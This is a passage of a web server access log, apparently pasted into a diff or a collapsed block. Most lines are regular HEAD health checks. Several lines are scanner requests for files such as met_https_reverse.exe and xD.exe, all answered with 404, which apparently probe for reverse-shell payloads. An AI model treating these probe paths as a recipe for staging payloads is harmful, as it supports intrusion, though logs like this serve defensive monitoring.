+ 208.115.199.27 - - 17/Jun/2022 04:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 04:28:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 04:33:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 04:38:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 04:43:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 04:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 04:53:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 04:58:24 HEAD / HTTP/1.1 200 -\n
+ 137.184.234.114 - - 17/Jun/2022 04:58:27 GET /script HTTP/1.1 404 -\n
+ 212.119.227.161 - - 17/Jun/2022 05:03:09 GET /account.exe HTTP/1.1 404 -\n
+ 212.119.227.161 - - 17/Jun/2022 05:03:24 GET /met_https_reverse.exe HTTP/1.1 404 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:03:24 HEAD / HTTP/1.1 200 -\n
+ 91.234.192.70 - - 17/Jun/2022 05:04:28 GET /xD.exe HTTP/1.1 404 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:08:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:18:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:28:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:33:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:38:24 HEAD / HTTP/1.1 200 -\n
+ 173.175.18.32 - - 17/Jun/2022 05:40:08 GET / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:43:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:53:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 05:58:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:08:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:13:24 HEAD / HTTP/1.1 200 -\n
+ 212.119.227.161 - - 17/Jun/2022 06:15:50 GET /account.exe HTTP/1.1 404 -\n
+ 89.208.29.69 - - 17/Jun/2022 06:16:05 GET /met_https_reverse.exe HTTP/1.1 404 -\n
+ 185.220.100.241 - - 17/Jun/2022 06:16:34 GET /xD.exe HTTP/1.1 404 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:18:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:28:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:33:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:38:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:43:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:53:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 06:58:24 HEAD / HTTP/1.1 200 -\n
+ 170.130.187.14 - - 17/Jun/2022 07:02:19 GET / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 07:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 07:08:24 HEAD / HTTP/1.1 200 -\n
 ```
 </details>
 
